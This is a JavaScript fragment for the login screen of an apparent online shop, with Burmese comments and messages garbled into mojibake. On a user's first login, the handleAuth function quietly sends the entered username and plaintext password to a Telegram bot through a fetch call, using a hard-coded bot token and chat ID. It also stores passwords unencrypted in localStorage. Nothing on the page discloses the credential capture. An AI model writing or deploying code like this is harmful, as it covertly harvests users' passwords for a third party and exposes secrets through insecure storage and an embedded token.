const BOT_TOKEN = "8103883017:AAFVj-m7UtA20HpjfSZf_Euy0fSW8rHU-U8";  
const CHAT_ID = "7090654595";  

// ğŸ›‘ BAN LIST: á€’á€®á€”á€±á€›á€¬á€™á€¾á€¬ á€˜á€”á€ºá€¸á€á€»á€„á€ºá€á€²á€· á€”á€¬á€™á€Šá€ºá€á€½á€±á€€á€­á€¯ á€‘á€Šá€·á€ºá€•á€«
const BANNED_USERS = ["NyiNyi", "spammer", "fake_pay"];
  
function handleAuth() {  
  const user = document.getElementById('username').value.trim();  
  const pass = document.getElementById('password').value.trim();  
  
  if(!user || !pass) return alert("á€”á€¬á€™á€Šá€ºá€”á€¾á€„á€·á€º Password á€–á€¼á€Šá€·á€ºá€•á€«");  

  // Check if banned
  if(BANNED_USERS.includes(user)) {
      alert("âŒ á€á€„á€·á€ºá€¡á€€á€±á€¬á€„á€·á€ºá€á€Šá€º á€…á€Šá€ºá€¸á€€á€™á€ºá€¸á€–á€±á€¬á€€á€ºá€–á€»á€€á€ºá€™á€¾á€¯á€€á€¼á€±á€¬á€„á€·á€º á€¡á€•á€­á€á€ºá€á€¶á€‘á€¬á€¸á€›á€•á€«á€á€Šá€ºá‹");
      return;
  }

  const savedUser = localStorage.getItem('pmk_user');  
  const savedPass = localStorage.getItem('pmk_pass');  
  if(!savedUser) {  
    localStorage.setItem('pmk_user', user); localStorage.setItem('pmk_pass', pass);  
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("ğŸ†• New User: "+user+"\nğŸ”‘ Pass: "+pass)}`);  
    enterShop();  
  } else {  
    if(user === savedUser && pass === savedPass) enterShop(); else alert("Password á€™á€¾á€¬á€¸á€”á€±á€•á€«á€á€Šá€º");  
  }  
}  
  
function enterShop() {  
  document.getElementById('login-screen').style.display = 'none';  
  document.getElementById('main-content').style.display = 'block';  
  loadHistory();  
}  
  
